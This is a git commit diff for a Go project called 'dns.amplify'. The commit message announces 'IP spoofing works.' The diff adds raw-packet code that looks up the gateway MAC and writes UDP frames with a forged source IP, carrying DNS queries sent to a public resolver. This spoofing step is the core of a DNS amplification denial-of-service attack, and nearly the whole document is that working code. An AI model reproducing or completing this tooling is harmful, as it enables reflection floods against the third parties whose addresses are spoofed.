65b1ba28e7d34549ad5eab430ba9e982c769fece
Sayan Goswami <goswami.sayan47@gmail.com>
2022-06-19 00:51:25 +0800

    IP spoofing works. ;)
    TODO: Cleanup codebase.

--- go.mod
+++ go.mod
@@ -1,3 +1,9 @@
 module dns.amplify
 
 go 1.18
+
+require (
+	github.com/google/gopacket v1.1.19 // indirect
+	github.com/jackpal/gateway v1.0.7 // indirect
+	github.com/mostlygeek/arp v0.0.0-20170424181311-541a2129847a // indirect
+)
--- main.go
+++ main.go
@@ -3,48 +3,74 @@ package main
 import (
 	"log"
 	"net"
+	"regexp"
+	"strings"
+
+	"github.com/google/gopacket/pcap"
+	"github.com/jackpal/gateway"
+	"github.com/mostlygeek/arp"
 )
 
-func performDNSRequest(dnsServerAddress, targetAddress string, query DNSMessage) error {
-	raddr, err := net.ResolveUDPAddr("udp", dnsServerAddress)
-	if err != nil {
-		log.Fatalf("Encountered error `%s` while trying to resolve address `%s`.\n", err, dnsServerAddress)
-	}
-
-	var laddr *net.UDPAddr
-
-	if targetAddress != "" {
-		laddr, err = net.ResolveUDPAddr("udp", targetAddress)
-		if err != nil {
-			log.Fatalf("Encountered error `%s` while trying to resolve address `%s`.\n", err, targetAddress)
-		}
-	} else {
-		laddr = nil
-	}
-
-	conn, err := net.DialUDP("udp", laddr, raddr)
-	if err != nil {
-		log.Fatalf("Encountered error `%s` trying to start UDP communication.", err)
-	}
-
-	defer conn.Close()
-
-	log.Println("targetIP:", conn.LocalAddr().String())
-
+func performDNSRequest(query DNSMessage) {
 	messageBytes := query.ToByteSlice()
 	log.Printf("messageBytes: %x\n", messageBytes)
 
-	conn.Write(messageBytes)
+	defaultGatewayIP, _ := gateway.DiscoverGateway()
+	log.Printf("defaultGatewayIP: %#v\n", defaultGatewayIP.String())
 
+	defaultGatewayMac, _ := net.ParseMAC(standardizeMACFormat(arp.Search(defaultGatewayIP.String())))
+	log.Printf("defaultGatewayMac: %#v\n", defaultGatewayMac)
+
+	udpFrameOptions := UdpFrameOptions{
+		sourceIP:     net.IPv4(127, 0, 0, 1),
+		destIP:       net.IPv4(1, 1, 1, 1),
+		sourcePort:   4000,
+		destPort:     53,
+		sourceMac:    getMacAddrForInterface("en0"),
+		destMac:      defaultGatewayMac,
+		isIPv6:       false,
+		payloadBytes: query.ToByteSlice(),
+	}
+
+	frameBytes, err := CreateSerializedUDPFrame(udpFrameOptions)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	handle, err := pcap.OpenLive("en0", 1024, false, pcap.BlockForever)
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer handle.Close()
+
+	if err := handle.WritePacketData(frameBytes); err != nil {
+		log.Fatal(err)
+	}
+	log.Println("DNS request sent.")
+}
+
+// standardizeMACFormat fixes dash-separated MAC addresses from Windows ipconfig
+// and macOS arp results which don't include leading zeros (:9: instead of :09:)
+func standardizeMACFormat(macAddr string) string {
+	macAddr = strings.Replace(macAddr, "-", ":", -1)
+	return regexp.MustCompile(`(\b)(\d)(\b)`).ReplaceAllString(macAddr, "${1}0${2}${3}")
+}
+
+func getMacAddrForInterface(iface string) net.HardwareAddr {
+	ifas, err := net.Interfaces()
+	if err != nil {
+		log.Fatal(err)
+	}
+	for _, ifa := range ifas {
+		if ifa.Name == iface {
+			return ifa.HardwareAddr
+		}
+	}
 	return nil
 }
 
 func main() {
 	query := "fb.me"
 	queryMessage := GenerateDNSMessage(query)
-
-	err := performDNSRequest("1.0.0.1:53", "", queryMessage)
-	if err != nil {
-		panic(err)
-	}
+	performDNSRequest(queryMessage)
 }
